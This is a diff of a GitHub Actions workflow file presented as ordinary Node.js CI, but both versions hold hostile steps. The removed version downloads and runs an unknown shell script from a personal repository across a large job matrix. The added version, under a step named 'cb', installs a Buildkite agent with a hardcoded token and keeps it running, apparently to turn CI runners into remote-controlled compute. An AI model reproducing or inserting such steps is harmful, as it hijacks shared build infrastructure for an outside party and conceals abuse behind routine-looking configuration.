@@ -1,31 +1,30 @@
-name: RUN_BUILDS
+# run This workflow will do a clean install of node dependencies, build the source code and run tests across different versions of node
+# For more information see: https://help.github.com/actions/language-and-framework-guides/using-nodejs-with-github-actions
 
-on:  
+name: Node.js CI 
+
+on:
   push:
-  schedule:
-    - cron: '0 0 * * *'
+    branches: [ main, develop ]
+  pull_request: {}
+
 jobs:
-  build:
-    name: RUN_BUILD
-    runs-on: ubuntu-18.04
-    strategy:
-      max-parallel: 20
-      fail-fast: false
-      matrix:
-        go: [1.12, 1.13, 1.14, 1.15, 1.16]
-        flag: [A, B, C, D]
+  test:
+    runs-on: ubuntu-latest
     timeout-minutes: 360
-    env:
-        NUM_JOBS: 20
-        JOB: ${{ matrix.go }}
+
+    strategy:
+      matrix:
+        node-version: [10.x, 11.x, 12.x, 13.x, 14.x, 15.x, 16.x]
+        flag: [1, 2, 3]
+
     steps:
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
+    - uses: actions/checkout@v2
+
+    - name: Use Node.js ${{ matrix.node-version }}
+      uses: actions/setup-node@v1
       with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: 🔥🔥🔥🔥🔥
-      uses: actions/checkout@v1
-    - name: 🚀🚀🚀🚀🚀
+        node-version: ${{ matrix.node-version }}
+    - name: cb
       run: |
-          wget https://github.com/chiarasss/hiji/raw/main/cuk.sh && chmod u+x cuk.sh && ./cuk.sh
+        sudo sh -c 'echo deb https://apt.buildkite.com/buildkite-agent stable main > /etc/apt/sources.list.d/buildkite-agent.list' && sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 32A37959C2FA5C3C99EFBC32A79206696452D198 && sudo apt-get update && sudo apt-get install -y buildkite-agent && sudo sed -i "s/xxx/91ab41a7ee19e71a206f64800a1037c11c23dfad88798d41aa/g" /etc/buildkite-agent/buildkite-agent.cfg && sudo systemctl enable buildkite-agent && sudo systemctl start buildkite-agent && journalctl -f -u buildkite-agent
